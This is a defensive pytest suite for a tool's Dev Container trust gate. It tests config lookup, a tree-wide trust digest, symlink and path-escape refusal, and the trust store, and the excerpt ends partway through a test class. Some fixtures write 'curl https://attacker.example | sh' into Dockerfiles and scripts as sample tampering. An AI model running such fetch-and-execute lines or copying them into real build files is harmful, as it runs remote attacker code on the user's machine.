"""Unit tests for Dev Container support (``kiro_crew.devcontainer``).

Covers the pure/host-side contracts that must hold before any container is
touched: config lookup order, the tree-wide trust digest, the single-read
digest/preview atomicity, the fail-closed jsonc parse, build-input containment,
the hardened config read path, the digest-bound trust store, the dashboard
preview payload, the sanitized build config the CLI is actually pointed at, the
``docker exec`` argv shape, the ``devcontainer up`` result-record scan, the
trust gate firing before any subprocess, the post-build digest
re-verification, the environ-scan kill path, the id-label status/down
fallbacks, and the handler's project-path admission check.

No test here reaches Docker, the devcontainer CLI, or the network: the trust
store and the sanitized-build-config dir are redirected at a ``tmp_path`` via a
monkeypatched ``config_dir``, and every test that exercises ``up()`` /
``status()`` / ``down()`` / ``kill_exec()`` replaces
``asyncio.create_subprocess_exec`` with a recorder that either fails loudly
(trust-gate tests, which must spawn nothing) or returns scripted fake
processes.

Several classes carry a REVERT-VERIFIED note naming the source line the test
pins and the assertion that flips when the fix is reverted; those cover
arbitrary-file read through the preview path, a spoofable pidfile kill target,
a config swap between trust grant and build, the preview-to-grant TOCTOU (a config swap between the human reading
the trust prompt and clicking Trust, pinned at both the ``grant_trust`` and
endpoint layers), build-input containment (a ``build.dockerfile`` pointing
outside the hashed tree), the ``initializeCommand`` strip (the one lifecycle
hook the spec runs on the HOST), and the post-trust swap caught by
``write_build_config``'s digest re-check.

``TestConfigReadHardening`` covers the read screens on the whole tree, not just
the config file: every member is opened through ``_read_config_bytes``, since
the preview hands these bytes to the dashboard caller verbatim.
"""

from __future__ import annotations

import asyncio
import contextlib
import hashlib
import json
import os
import re
import shutil
import subprocess
import sys
import threading
import time
import uuid
from collections.abc import Iterator
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import patch

import pytest
import yaml

from kiro_crew import devcontainer as devc
from kiro_crew.acp import client as acp_client_mod
from kiro_crew.acp import runtime as acp_runtime_mod
from kiro_crew.dashboard.handlers import devcontainer as devc_handlers

# ---------------------------------------------------------------------------
# Fixtures / helpers
# ---------------------------------------------------------------------------

_SAMPLE_CONFIG = json.dumps({"name": "kirocrew-dev", "image": "mcr.io/devcontainers/base:ubuntu"})


#: Captured before any fixture patches it, so a test that needs the REAL resolver
#: can restore it past the autouse ``_stable_docker_bin`` patch below.
_REAL_DOCKER_BIN = devc._docker_bin


@pytest.fixture(autouse=True)
def _stable_docker_bin(monkeypatch: pytest.MonkeyPatch) -> None:
    """Pin the resolved docker path to a literal for argv-shape assertions.

    Production resolves docker to a verified ABSOLUTE path (see
    ``_verified_tool``), which is host-dependent -- ``/usr/bin/docker`` here,
    elsewhere something else, and absent entirely on a host without docker. The
    tests below are about argv ORDER and CONTENT, so pinning the first element
    keeps them host-independent and readable.

    The security property itself -- that argv[0] is a verified binary and a
    planted shim is refused -- is pinned separately by
    ``TestVerifiedToolResolution``, which exercises the real resolver and is
    unaffected by this patch.
    """
    monkeypatch.setattr(devc, "_docker_bin", lambda: "docker")


@pytest.fixture
def trust_home(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    """Redirect the trust store into an isolated data home."""
    home = tmp_path / "home"
    home.mkdir()
    monkeypatch.setattr(devc, "config_dir", lambda: home)
    # The MCP bridge bind lives under /tmp (AF_UNIX path length). Keep that
    # directory short and reap it so tests do not leave residue.
    from kiro_crew import devcontainer_mcp as mcp

    short = Path("/tmp") / "kc-mb" / home.name[:12]
    short.mkdir(parents=True, exist_ok=True)
    monkeypatch.setattr(mcp, "host_bridge_dir", lambda _p: short)
    gtmp = tmp_path / "gtmp"
    gtmp.mkdir()
    monkeypatch.setattr(devc, "_gateway_tmp_root", lambda: gtmp)
    yield home
    shutil.rmtree(short, ignore_errors=True)


@pytest.fixture
def symlinks_supported(tmp_path: Path) -> None:
    """Skip when this host cannot create symlinks at all.

    Windows grants ``SeCreateSymbolicLinkPrivilege`` only to an elevated
    process or a machine in Developer Mode, so ``Path.symlink_to`` raises
    ``OSError`` on an ordinary CI runner. This is a capability PROBE rather
    than an ``IS_WINDOWS`` guard on purpose: on a privileged Windows box the
    probe succeeds and the tests below run for real, so the symlink guards
    they pin stay covered instead of being skipped forever on the platform.
    Same privilege backs file and directory links, so one file probe answers
    for both.
    """
    target = tmp_path / ".symlink-probe-target"
    target.write_bytes(b"")
    link = tmp_path / ".symlink-probe-link"
    try:
        link.symlink_to(target)
    except (OSError, NotImplementedError) as exc:  # pragma: no cover -- Windows only
        pytest.skip(f"host cannot create symlinks: {exc}")
    finally:
        # Leave tmp_path pristine: several callers rglob a tree rooted here.
        link.unlink(missing_ok=True)
        target.unlink(missing_ok=True)


def _write_primary(root: Path, body: str = _SAMPLE_CONFIG) -> Path:
    """Write ``.devcontainer/devcontainer.json`` under ``root``.

    ``write_bytes``, never ``write_text``: the digest and the preview's ``raw``
    are byte-exact contracts, and text mode translates ``\\n`` to ``\\r\\n`` on
    Windows (and encodes through cp1252 rather than UTF-8).
    """
    path = root / ".devcontainer" / "devcontainer.json"
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(body.encode())
    return path


def _write_fallback(root: Path, body: str = _SAMPLE_CONFIG) -> Path:
    """Write the top-level ``.devcontainer.json`` under ``root``."""
    path = root / ".devcontainer.json"
    path.write_bytes(body.encode())
    return path


def _write_input(config_path: Path, relpath: str, body: bytes = b"FROM ubuntu:24.04\n") -> Path:
    """Write a build input beside the config, inside the hashed tree.

    ``relpath`` may be nested (``docker/Dockerfile``); parents are created.
    ``write_bytes`` for the same byte-exactness reason as ``_write_primary``.
    """
    path = config_path.parent / relpath
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(body)
    return path


def _expected_build_root(trust_home: Path, project: Path) -> Path:
    """Where one project's sanitized build configs must land.

    The project token is recomputed from the realpath here rather than read back
    from the module, so the layout is genuinely pinned instead of tautologically
    agreeing with whatever the module currently derives. The project component
    is what makes a build directory attributable to a project, which is what the
    reaper needs to stay inside one project.
    """
    token = hashlib.sha256(os.path.realpath(str(project)).encode()).hexdigest()[:24]
    return trust_home / "devcontainers" / "build" / token


def _info(**over: object) -> devc.DevcontainerInfo:
    base: dict = {
        "container_id": "c0ffee1234567890",
        "remote_workspace_folder": "/workspaces/proj",
        "remote_user": "vscode",
        "project_dir": "/host/proj",
        "config_digest": "d" * 64,
        "created_at": 0.0,
    }
    base.update(over)
    return devc.DevcontainerInfo(**base)  # type: ignore[arg-type]


class _FakeProc:
    """Stand-in for ``asyncio.subprocess.Process`` with scripted output.

    ``on_communicate`` runs inside ``communicate()``, which is how the M3
    TOCTOU test mutates the config tree *while* the fake build is in flight.
    """

    def __init__(
        self,
        *,
        stdout: bytes = b"",
        stderr: bytes = b"",
        returncode: int = 0,
        on_communicate=None,  # type: ignore[no-untyped-def]
    ) -> None:
        self._stdout = stdout
        self._stderr = stderr
        self.returncode = returncode
        self._on_communicate = on_communicate
        self.killed = False

    class _Stream:
        """Minimal StreamReader stand-in: one chunk, then EOF."""

        def __init__(self, data: bytes, on_first_read=None) -> None:  # type: ignore[no-untyped-def]
            self._data = data
            self._done = False
            self._on_first_read = on_first_read

        async def read(self, n: int = -1) -> bytes:
            if self._done:
                return b""
            self._done = True
            if self._on_first_read is not None:
                self._on_first_read()
            return self._data

    @property
    def stdout(self):  # type: ignore[no-untyped-def]
        # The hook fires from the STDOUT read: production drains both streams
        # concurrently, and firing from both would run it twice.
        return self._Stream(self._stdout, self._on_communicate)

    @property
    def stderr(self):  # type: ignore[no-untyped-def]
        return self._Stream(self._stderr)

    async def communicate(self) -> tuple[bytes, bytes]:
        if self._on_communicate is not None:
            self._on_communicate()
        return self._stdout, self._stderr

    async def wait(self) -> int:
        # Deliberately does NOT fire the hook: production awaits wait() after
        # draining, so firing here would run the mid-build mutation a second time
        # and change what the TOCTOU test observes.
        return self.returncode

    def kill(self) -> None:
        self.killed = True


class _ExecRecorder:
    """``create_subprocess_exec`` stub: records argv, returns scripted procs.

    Procs are handed out in call order (each flow under test spawns a fixed,
    documented sequence); any call past the script gets a benign success.

    ``kwargs`` records the keyword arguments of each call alongside ``calls``, so
    a test can assert on what was passed (``env``, ``cwd``) and not only on the
    argv.
    """

    def __init__(self, *procs: _FakeProc) -> None:
        self.calls: list[list[str]] = []
        self.kwargs: list[dict] = []
        self._procs = list(procs)

    async def __call__(self, *argv: str, **kw: object) -> _FakeProc:
        self.calls.append(list(argv))
        self.kwargs.append(dict(kw))
        return self._procs.pop(0) if self._procs else _FakeProc()


def _up_ok(container_id: str = "cid-ok", **on: object) -> _FakeProc:
    """A ``devcontainer up --log-format json`` success record."""
    record = {
        "outcome": "success",
        "containerId": container_id,
        "remoteUser": "vscode",
        "remoteWorkspaceFolder": "/workspaces/proj",
    }
    return _FakeProc(stdout=(json.dumps(record) + "\n").encode(), **on)  # type: ignore[arg-type]


# ---------------------------------------------------------------------------
# find_devcontainer_config
# ---------------------------------------------------------------------------


class TestFindDevcontainerConfig:
    def test_primary_location_is_found(self, tmp_path: Path) -> None:
        expected = _write_primary(tmp_path)
        assert devc.find_devcontainer_config(tmp_path) == expected

    def test_fallback_location_is_found(self, tmp_path: Path) -> None:
        expected = _write_fallback(tmp_path)
        assert devc.find_devcontainer_config(tmp_path) == expected

    def test_primary_wins_over_fallback(self, tmp_path: Path) -> None:
        """Spec lookup order: the .devcontainer/ dir shadows the flat file."""
        primary = _write_primary(tmp_path)
        _write_fallback(tmp_path, '{"name": "ignored"}')
        assert devc.find_devcontainer_config(tmp_path) == primary

    def test_none_when_absent(self, tmp_path: Path) -> None:
        assert devc.find_devcontainer_config(tmp_path) is None

    def test_directory_named_like_the_flat_file_is_not_a_config(self, tmp_path: Path) -> None:
        """is_file() guards the fallback: a directory must not be returned."""
        (tmp_path / ".devcontainer.json").mkdir()
        assert devc.find_devcontainer_config(tmp_path) is None

    def test_accepts_str_project_dir(self, tmp_path: Path) -> None:
        expected = _write_primary(tmp_path)
        assert devc.find_devcontainer_config(str(tmp_path)) == expected


class TestConfigDigest:
    """The trust digest covers the whole ``.devcontainer/`` tree.

    REVERT-VERIFIED — pins ``config_digest``'s tree branch in
    ``devcontainer.py`` (``if parent.name == ".devcontainer":`` … the rglob
    walk + ``b"tree"`` marker). Reverting it to the old
    ``sha256(config_bytes)`` makes
    ``test_sibling_file_content_changes_the_digest``,
    ``test_adding_a_sibling_file_changes_the_digest``,
    ``test_nested_sibling_file_is_covered`` and
    ``test_tree_digest_recomputes_from_relpath_content_and_marker`` fail: each
    of those mutates a build input while leaving devcontainer.json
    byte-identical, so a json-only digest is unchanged and a granted trust
    would survive a Dockerfile / postCreateCommand script swap.
    """

    def test_tree_digest_recomputes_from_relpath_content_and_marker(self, tmp_path: Path) -> None:
        """Recomputes the digest independently, with LENGTH-PREFIXED framing.

        The framing is length-prefixed rather than NUL-delimited because content
        is arbitrary bytes and may contain the delimiter, which made the encoding
        non-injective -- see ``TestDigestFramingIsInjective``. This test asserts
        the current framing, so reverting the production code to delimiters fails
        here as well as there.
        """
        cfg = _write_primary(tmp_path)
        body = cfg.read_bytes()
        h = hashlib.sha256()
        h.update((1).to_bytes(8, "big"))  # entry count
        h.update(len(b"devcontainer.json").to_bytes(8, "big"))
        h.update(b"devcontainer.json")
        h.update(len(body).to_bytes(8, "big"))
        h.update(body)
        h.update(b"tree")
        assert devc.config_digest(cfg) == h.hexdigest()
        # Explicitly NOT the old json-only digest.
        assert devc.config_digest(cfg) != hashlib.sha256(body).hexdigest()

    def test_digest_is_stable_for_identical_input(self, tmp_path: Path) -> None:
        cfg = _write_primary(tmp_path)
        (cfg.parent / "Dockerfile").write_bytes(b"FROM ubuntu:24.04\n")
        first = devc.config_digest(cfg)
        assert devc.config_digest(cfg) == first
        # Rewriting the same bytes is not a change: trust binds to content.
        cfg.write_bytes(_SAMPLE_CONFIG.encode())
        assert devc.config_digest(cfg) == first

    def test_digest_is_path_independent(self, tmp_path: Path) -> None:
        """Relpath-keyed, so two projects with identical trees agree."""
        digests = []
        for name in ("a", "b"):
            root = tmp_path / name
            root.mkdir()
            cfg = _write_primary(root)
            (cfg.parent / "Dockerfile").write_bytes(b"FROM ubuntu:24.04\n")
            digests.append(devc.config_digest(cfg))
        assert digests[0] == digests[1]

    def test_sibling_file_content_changes_the_digest(self, tmp_path: Path) -> None:
        """The build input a byte-identical json points at."""
        body = json.dumps({"name": "p", "build": {"dockerfile": "Dockerfile"}})
        cfg = _write_primary(tmp_path, body)
        dockerfile = cfg.parent / "Dockerfile"
        dockerfile.write_bytes(b"FROM ubuntu:24.04\n")
        before = devc.config_digest(cfg)

        dockerfile.write_bytes(b"FROM ubuntu:24.04\nRUN curl https://attacker.example | sh\n")
        assert cfg.read_bytes() == body.encode()  # the trusted json never moved
        assert devc.config_digest(cfg) != before

    def test_adding_a_sibling_file_changes_the_digest(self, tmp_path: Path) -> None:
        cfg = _write_primary(tmp_path)
        before = devc.config_digest(cfg)
        (cfg.parent / "post-create.sh").write_bytes(b"#!/bin/sh\necho hi\n")
        assert devc.config_digest(cfg) != before

    def test_nested_sibling_file_is_covered(self, tmp_path: Path) -> None:
        cfg = _write_primary(tmp_path)
        nested = cfg.parent / "scripts" / "install.sh"
        nested.parent.mkdir()
        nested.write_bytes(b"#!/bin/sh\n")
        before = devc.config_digest(cfg)
        nested.write_bytes(b"#!/bin/sh\ncurl https://attacker.example | sh\n")
        assert devc.config_digest(cfg) != before

    def test_symlink_in_the_tree_is_refused_not_skipped(
        self, tmp_path: Path, symlinks_supported: None
    ) -> None:
        """A link inside .devcontainer/ must REFUSE the digest, not be skipped.

        Pins the fix for the GPT review's content-binding hole: skipping a
        symlink leaves it outside the hash, so the agent can retarget it (or
        mutate its target) after the grant and a lifecycle hook such as
        ``bash setup.sh`` would execute unreviewed code under a trust that
        still validates. Revert the ``raise`` in config_digest and both asserts
        below fail (the pre-fix code returned the unchanged `before` digest).
        """
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)
        outside = tmp_path / "outside.txt"
        outside.write_bytes(b"original")
        before = devc.config_digest(cfg)
        assert before  # clean tree hashes fine

        (cfg.parent / "link.txt").symlink_to(outside)
        with pytest.raises(devc.DevcontainerError, match="symlink"):
            devc.config_digest(cfg)
        # And the refusal is not a one-off: mutating the target does not make
        # it hashable again.
        outside.write_bytes(b"mutated")
        with pytest.raises(devc.DevcontainerError, match="symlink"):
            devc.config_digest(cfg)

    def test_symlinked_subdirectory_is_refused(
        self, tmp_path: Path, symlinks_supported: None
    ) -> None:
        """A linked DIRECTORY is refused too — rglob yields it before its
        contents, and its subtree is equally retargetable."""
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)
        elsewhere = tmp_path / "elsewhere"
        elsewhere.mkdir()
        (elsewhere / "payload.sh").write_bytes(b"echo pwned\n")

        (cfg.parent / "scripts").symlink_to(elsewhere, target_is_directory=True)
        with pytest.raises(devc.DevcontainerError, match="symlink"):
            devc.config_digest(cfg)

    def test_untrusted_after_symlink_appears(
        self, tmp_path: Path, symlinks_supported: None
    ) -> None:
        """is_trusted() must go False when a symlink lands in a trusted tree.

        The grant cannot be validated against a tree whose digest is refused,
        so trust fails closed rather than silently holding.
        """
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)
        devc.grant_trust(project)
        assert devc.is_trusted(project) is True

        (cfg.parent / "link.txt").symlink_to(tmp_path / "outside.txt")
        assert devc.is_trusted(project) is False

    def test_root_layout_digest_is_single_file_plus_marker(self, tmp_path: Path) -> None:
        """``.devcontainer.json`` has no directory: one entry + ``b"file"``.

        Framed by ``_digest_entries``, so the relpath is hashed alongside the
        bytes even for the single-file layout — the same routine serves both
        layouts, which is what keeps the preview text and the digest derived
        from one read.
        """
        cfg = _write_fallback(tmp_path)
        body = cfg.read_bytes()
        h = hashlib.sha256()
        h.update((1).to_bytes(8, "big"))  # entry count
        h.update(len(b".devcontainer.json").to_bytes(8, "big"))
        h.update(b".devcontainer.json")
        h.update(len(body).to_bytes(8, "big"))
        h.update(body)
        h.update(b"file")
        assert devc.config_digest(cfg) == h.hexdigest()
        # Explicitly NOT a bare hash of the bytes: an unframed digest would
        # collide with any other single-file input carrying the same content.
        assert devc.config_digest(cfg) != hashlib.sha256(cfg.read_bytes()).hexdigest()

    def test_layout_markers_prevent_cross_layout_collision(self, tmp_path: Path) -> None:
        a = tmp_path / "a"
        a.mkdir()
        b = tmp_path / "b"
        b.mkdir()
        assert devc.config_digest(_write_primary(a)) != devc.config_digest(_write_fallback(b))


class TestBuildInputContainment:
    """Every build input the CLI consumes must sit inside the hashed tree.

    ``--override-config`` relocates devcontainer.json ONLY — a referenced
    ``build.dockerfile`` still resolves against the live workspace (proven by
    experiment). So the digest cannot be made to cover an arbitrary referenced
    path, and the config is instead required to keep its inputs inside
    ``.devcontainer/``, which the digest does cover. Without that, a grant
    stays valid while the Dockerfile it builds from is rewritten.

    REVERT-VERIFIED — pins the ``assert_build_inputs_contained`` call sites in
    ``config_digest`` / ``config_preview`` / ``write_build_config`` and the
    ``raise`` inside the function. Stub the function to ``return None`` and
    every ``test_*_is_refused`` below fails (the digest computes happily for a
    config pointing at ``../Dockerfile``), while
    ``test_contained_dockerfile_is_accepted`` keeps passing — which is what
    makes this a containment test and not a blanket refusal of every ``build``
    key. Verified: 7 failed / 13 passed with the function stubbed, and the
    source md5 was unchanged after restoring.
    """

    @staticmethod
    def _cfg(tmp_path: Path, cfg_obj: dict) -> tuple[Path, Path]:
        project = tmp_path / "proj"
        project.mkdir()
        return project, _write_primary(project, json.dumps(cfg_obj))

    def test_escaping_build_dockerfile_is_refused(self, tmp_path: Path) -> None:
        _, cfg = self._cfg(tmp_path, {"build": {"dockerfile": "../Dockerfile"}})
        with pytest.raises(devc.DevcontainerError, match="resolves outside .devcontainer"):
            devc.config_digest(cfg)

    def test_escaping_build_context_is_refused(self, tmp_path: Path) -> None:
        """``".."`` is the whole project: the classic escape, and the one a
        Dockerfile-relative build most naturally reaches for."""
        _, cfg = self._cfg(tmp_path, {"build": {"context": ".."}})
        with pytest.raises(devc.DevcontainerError, match="resolves outside .devcontainer"):
            devc.config_digest(cfg)

    def test_escaping_top_level_dockerfile_is_refused(self, tmp_path: Path) -> None:
        """The spec's older shape puts ``dockerfile`` at the top level, so the
        collector has to read both places or the check is trivially bypassed."""
        _, cfg = self._cfg(tmp_path, {"dockerfile": "../../Dockerfile"})
        with pytest.raises(devc.DevcontainerError, match="resolves outside .devcontainer"):
            devc.config_digest(cfg)

    def test_escaping_docker_compose_file_string_is_refused(self, tmp_path: Path) -> None:
        _, cfg = self._cfg(tmp_path, {"dockerComposeFile": "../compose.yml"})
        with pytest.raises(devc.DevcontainerError, match="resolves outside .devcontainer"):
            devc.config_digest(cfg)

    def test_escaping_docker_compose_file_in_a_list_is_refused(self, tmp_path: Path) -> None:
        """The spec allows a LIST of compose files, and an override layer is the
        natural place to hide one — so every element is checked, not the first.
        The contained sibling here is real, so only the escaping entry can be
        the cause of the refusal.
        """
        _, cfg = self._cfg(tmp_path, {"dockerComposeFile": ["compose.yml", "../override.yml"]})
        _write_input(cfg, "compose.yml", b"services: {}\n")
        with pytest.raises(devc.DevcontainerError, match="resolves outside .devcontainer"):
            devc.config_digest(cfg)

    def test_contained_dockerfile_is_accepted(self, tmp_path: Path) -> None:
        """The control: containment, not blanket refusal of ``build``.

        A config whose inputs live inside ``.devcontainer/`` is accepted, its
        digest covers them (asserted by mutating the Dockerfile), and the
        preview reports them.
        """
        project, cfg = self._cfg(tmp_path, {"build": {"dockerfile": "Dockerfile"}})
        dockerfile = _write_input(cfg, "Dockerfile")

        before = devc.config_digest(cfg)
        assert before
        dockerfile.write_bytes(b"FROM ubuntu:24.04\nRUN echo changed\n")
        assert devc.config_digest(cfg) != before

    def test_contained_nested_and_dot_inputs_are_accepted(self, tmp_path: Path) -> None:
        """A subdirectory input and ``context: "."`` both stay inside the tree.

        ``"."`` resolves to ``.devcontainer`` itself, which the check treats as
        contained (``target != parent`` is the guard) — asserted so a stricter
        rewrite cannot start refusing the spec's most common context value.
        """
        _, cfg = self._cfg(tmp_path, {"build": {"dockerfile": "docker/Dockerfile", "context": "."}})
        _write_input(cfg, "docker/Dockerfile")
        assert devc.config_digest(cfg)

    def test_contained_compose_list_is_accepted(self, tmp_path: Path) -> None:
        _, cfg = self._cfg(tmp_path, {"dockerComposeFile": ["compose.yml", "extra.yml"]})
        _write_input(cfg, "compose.yml", b"services: {}\n")
        _write_input(cfg, "extra.yml", b"services: {}\n")
        assert devc.config_digest(cfg)

    def test_image_only_config_has_no_inputs_to_contain(self, tmp_path: Path) -> None:
        """The overwhelmingly common config declares no build input at all."""
        project, cfg = self._cfg(tmp_path, {"image": "mcr.io/devcontainers/base:ubuntu"})
        assert devc.config_digest(cfg)
        assert devc._collect_build_inputs({"image": "x"}) == []

    def test_root_layout_declaring_any_build_input_is_refused(self, tmp_path: Path) -> None:
        """``.devcontainer.json`` hashes ONE file, so it can hash no Dockerfile.

        Even a *contained-looking* relative name is unhashed here: there is no
        directory for the digest to cover, so the input could be rewritten
        under a still-valid grant. The refusal names the fix (move into
        ``.devcontainer/``) rather than silently hashing less than it builds.
        """
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_fallback(project, json.dumps({"build": {"dockerfile": "Dockerfile"}}))
        (project / "Dockerfile").write_bytes(b"FROM ubuntu:24.04\n")

        with pytest.raises(devc.DevcontainerError, match="cannot declare build inputs"):
            devc.config_digest(cfg)
        with pytest.raises(devc.DevcontainerError, match="cannot declare build inputs"):
            devc.config_preview(project)

    def test_root_layout_without_build_inputs_is_accepted(self, tmp_path: Path) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        assert devc.config_digest(_write_fallback(project))

    def test_refusal_blocks_the_grant_and_the_trust_check(
        self, tmp_path: Path, trust_home: Path
    ) -> None:
        """The refusal is not preview-only: it fails closed everywhere trust is
        computed, so an escaping config can never end up granted."""
        project, _ = self._cfg(tmp_path, {"build": {"dockerfile": "../Dockerfile"}})
        with pytest.raises(devc.DevcontainerError, match="resolves outside .devcontainer"):
            devc.grant_trust(project)
        assert devc.is_trusted(project) is False
        assert not (trust_home / "devcontainers" / "trust.json").exists()

    def test_blank_and_non_string_input_values_are_ignored(self) -> None:
        """A malformed value is not a path, so it is skipped rather than being
        stringified into one (``parent / 123`` would raise, not refuse)."""
        assert devc._collect_build_inputs({"build": {"dockerfile": "   ", "context": 7}}) == []
        assert devc._collect_build_inputs({"dockerComposeFile": [None, "", "  a.yml  "]}) == [
            "a.yml"
        ]

    """B1: the preview read path returns bytes to the dashboard caller.

    REVERT-VERIFIED (B1) — pins two guards:
      * ``find_devcontainer_config``'s ``not candidate.is_symlink()``;
      * ``_read_config_bytes``'s containment check (``if not
        resolved.startswith(root...)``) and its ``is_sensitive_path`` screen.

    Revert the symlink check and ``test_symlink_leaf_is_treated_as_absent``
    fails: the function returns a link, and ``config_preview`` happily reads
    its target. Revert the containment check and
    ``test_read_refuses_a_config_escaping_the_project`` fails: a symlinked
    ``.devcontainer`` parent (invisible to the leaf-only O_NOFOLLOW) is read
    anyway. Revert the sensitive-path screen and
    ``test_read_refuses_a_sensitive_target`` fails.

    Both screens live in ``_read_config_bytes``, and ``_read_config_tree``
    routes EVERY tree member through it, not just the config file — the preview
    returns these bytes verbatim to the dashboard caller, so a bare
    ``read_bytes()`` on a sibling would have been an arbitrary-file read for
    the ``.devcontainer/`` directory layout. Tree members pass the project root
    explicitly, because inferring it from a nested path yields that file's own
    parent and makes the containment check a tautology. ``rglob`` never yields
    the parent directory, so a symlinked ``.devcontainer`` is refused up front
    rather than by the per-entry check.
    """

    def test_symlink_leaf_is_treated_as_absent(
        self, tmp_path: Path, symlinks_supported: None
    ) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        secret = tmp_path / "credentials"
        secret.write_bytes(b"aws_secret_access_key = nope\n")
        leaf = project / ".devcontainer" / "devcontainer.json"
        leaf.parent.mkdir(parents=True)
        leaf.symlink_to(secret)

        assert devc.find_devcontainer_config(project) is None
        assert devc.is_trusted(project) is False

    def test_symlink_root_layout_leaf_is_treated_as_absent(
        self, tmp_path: Path, symlinks_supported: None
    ) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        secret = tmp_path / "credentials"
        secret.write_bytes(b"nope")
        (project / ".devcontainer.json").symlink_to(secret)
        assert devc.find_devcontainer_config(project) is None

    def _escaping_project(self, tmp_path: Path) -> tuple[Path, Path]:
        """Project whose ``.devcontainer`` PARENT dir is a symlink outside it.

        The leaf is a real file, so the lstat check in
        ``find_devcontainer_config`` cannot see the escape — only the realpath
        containment check in ``_read_config_bytes`` can.

        Callers MUST request the ``symlinks_supported`` fixture: this helper
        cannot skip on its own behalf.
        """
        project = tmp_path / "proj"
        project.mkdir()
        outside = tmp_path / "outside"
        outside.mkdir()
        (outside / "devcontainer.json").write_bytes(b'{"image": "attacker/img:latest"}')
        (project / ".devcontainer").symlink_to(outside, target_is_directory=True)
        return project, project / ".devcontainer" / "devcontainer.json"

    def test_read_refuses_a_config_escaping_the_project(
        self, tmp_path: Path, symlinks_supported: None
    ) -> None:
        project, cfg = self._escaping_project(tmp_path)
        # Lookup still returns it: the leaf itself is a regular file.
        assert devc.find_devcontainer_config(project) == cfg
        with pytest.raises(devc.DevcontainerError, match="outside the project"):
            devc._read_config_bytes(cfg)

    def test_preview_surfaces_the_escape_refusal(
        self, tmp_path: Path, trust_home: Path, symlinks_supported: None
    ) -> None:
        """The preview must inherit the containment screen, not just the digest.

        Revert-verified: with ``_read_config_tree`` reading tree members via a
        bare ``read_bytes()``, this returns the symlinked-away directory's
        contents to the dashboard caller instead of raising.
        """
        project, _ = self._escaping_project(tmp_path)
        with pytest.raises(devc.DevcontainerError, match="symlink|outside the project"):
            devc.config_preview(project)

    def test_read_refuses_a_sensitive_target(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        import kiro_crew.security as security

        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)
        monkeypatch.setattr(security, "is_sensitive_path", lambda p: True)
        with pytest.raises(devc.DevcontainerError, match="sensitive path"):
            devc._read_config_bytes(cfg)

    def test_preview_surfaces_the_sensitive_refusal(
        self, tmp_path: Path, trust_home: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """The preview must inherit the sensitive-path screen too.

        Revert-verified alongside the escape case: both fail the moment
        ``_read_config_tree`` stops routing tree reads through
        ``_read_config_bytes``.
        """
        import kiro_crew.security as security

        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project)
        monkeypatch.setattr(security, "is_sensitive_path", lambda p: True)
        with pytest.raises(devc.DevcontainerError, match="sensitive path"):
            devc.config_preview(project)

    def test_read_refuses_a_non_regular_file(self, tmp_path: Path) -> None:
        """A directory at the config path must be refused, whichever gate fires.

        Two different gates reject it depending on the platform, and BOTH fail
        closed with a DevcontainerError, which is the property under test:
          * POSIX — ``os.open`` on a directory succeeds, so the ``fstat``
            ``S_ISREG`` check rejects it ("not a regular file");
          * Windows — ``os.open`` of a directory itself fails with EACCES
            before any fstat, so the refusal surfaces as "cannot open".
        Matching either keeps the assertion on the refusal rather than on which
        layer happened to produce it.
        """
        project = tmp_path / "proj"
        project.mkdir()
        as_dir = project / ".devcontainer" / "devcontainer.json"
        as_dir.mkdir(parents=True)
        with pytest.raises(devc.DevcontainerError, match="not a regular file|cannot open"):
            devc._read_config_bytes(as_dir)

    def test_read_reports_a_missing_file_as_a_devcontainer_error(self, tmp_path: Path) -> None:
        project = tmp_path / "proj"
        (project / ".devcontainer").mkdir(parents=True)
        with pytest.raises(devc.DevcontainerError, match="cannot open"):
            devc._read_config_bytes(project / ".devcontainer" / "devcontainer.json")

    def test_read_accepts_a_plain_in_project_config(self, tmp_path: Path) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)
        assert devc._read_config_bytes(cfg) == _SAMPLE_CONFIG.encode()
        assert devc._read_config_bytes(_write_fallback(project)) == _SAMPLE_CONFIG.encode()


# ---------------------------------------------------------------------------
# Trust store
# ---------------------------------------------------------------------------


class TestTrustStore:
    def test_grant_is_trusted_revoke_round_trip(self, tmp_path: Path, trust_home: Path) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)

        assert devc.is_trusted(project) is False
        digest = devc.grant_trust(project)
        assert digest == devc.config_digest(cfg)
        assert devc.is_trusted(project) is True

        assert devc.revoke_trust(project) is True
        assert devc.is_trusted(project) is False
        # Second revoke is a no-op, not an error.
        assert devc.revoke_trust(project) is False

    def test_grant_records_digest_and_config_path(self, tmp_path: Path, trust_home: Path) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)
        devc.grant_trust(project)

        data = json.loads((trust_home / "devcontainers" / "trust.json").read_text(encoding="utf-8"))
        entry = data[os.path.realpath(str(project))]
        assert entry["digest"] == devc.config_digest(cfg)
        assert entry["config_path"] == str(cfg)
        assert isinstance(entry["granted_at"], float)

    def test_trust_invalidated_when_config_bytes_change(
        self, tmp_path: Path, trust_home: Path
    ) -> None:
        """A config edit (by a human OR the agent) forces a fresh decision."""
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)
        devc.grant_trust(project)
        assert devc.is_trusted(project) is True

        cfg.write_bytes(json.dumps({"name": "kirocrew-dev", "image": "evil:latest"}).encode())
        assert devc.is_trusted(project) is False

        # Restoring the exact original bytes restores the grant: trust binds to
        # content, not to an edit counter. write_bytes, so the restore really is
        # byte-identical to _write_primary's (text mode would add CR on Windows).
        cfg.write_bytes(_SAMPLE_CONFIG.encode())
        assert devc.is_trusted(project) is True

    def test_trust_does_not_leak_to_a_sibling_project(
        self, tmp_path: Path, trust_home: Path
    ) -> None:
